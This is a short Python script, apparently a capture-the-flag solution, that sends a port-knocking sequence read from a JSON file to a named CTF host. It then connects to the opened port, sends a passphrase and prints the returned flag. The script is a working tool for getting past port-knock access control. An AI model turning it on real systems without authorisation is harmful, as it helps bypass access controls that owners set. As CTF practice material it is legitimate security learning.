#!/usr/bin/env python3

import time
import socket
import select
import json

class Knocker(object):
    def __init__(self, ports_proto: list, delay=400, udp=False, timeout=200, host="127.0.0.1"):
        self.timeout = timeout / 1000
        self.delay = delay / 1000
        self.default_udp = udp
        self.ports_proto = ports_proto

        self.address_family, _, _, _, (self.ip_address, _) = socket.getaddrinfo(
                host=host,
                port=None,
                flags=socket.AI_ADDRCONFIG
            )[0]

    def knock_it(self):
        last_index = len(self.ports_proto) - 1
        for i, port in enumerate(self.ports_proto):
            use_udp = self.default_udp
            if port.find(':') != -1:
                port, protocol = port.split(':', 2)
                if protocol == 'TCP':
                    use_udp = False
                elif protocol == 'UDP':
                    use_udp = True
                else:
                    error = 'WTF!'
                    raise ValueError(error.format(protocol))

            s = socket.socket(self.address_family, socket.SOCK_DGRAM if use_udp else socket.SOCK_STREAM)
            s.setblocking(False)

            socket_address = (self.ip_address, int(port))
            if use_udp:
                print("Knocking port {} using UDP".format(port))
                s.sendto(b'', socket_address)
            else:
                print("Knoocking port {} using TCP".format(port))
                s.connect_ex(socket_address)
                select.select([s], [s], [s], self.timeout)

            s.close()

            if self.delay and i != last_index:
                time.sleep(self.delay)


if __name__ == '__main__':
    host = "you-shall-not-pass.ctf.insecurity-insa.fr"
    print("[?] Getting Data ...")
    json_file = open("file.tar", "r")
    data = json.load(json_file)
    open_sesame = data["open_sesame"]
    ports_proto = [str(i["port"])+":"+i["proto"] for i in data["sequence"]]
    print("[+] Knocking Ports now...")
    Knocker(ports_proto, delay=900, host=host).knock_it()
    time.sleep(1)
    print("[?] Asking for Flag ...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(data["door"])))
    except Exception as e:
        print("[!] CONNECTION FAILED!!!, Port may not be opened")
    else:
        print("[+] DOOR OPENED")
        s.send(open_sesame.encode())
        try:
            flag = s.recv(2014).decode()
            print("Got flag: ", flag)
        except Exception as e:
            print("NOTHING")
    finally:
        s.close()

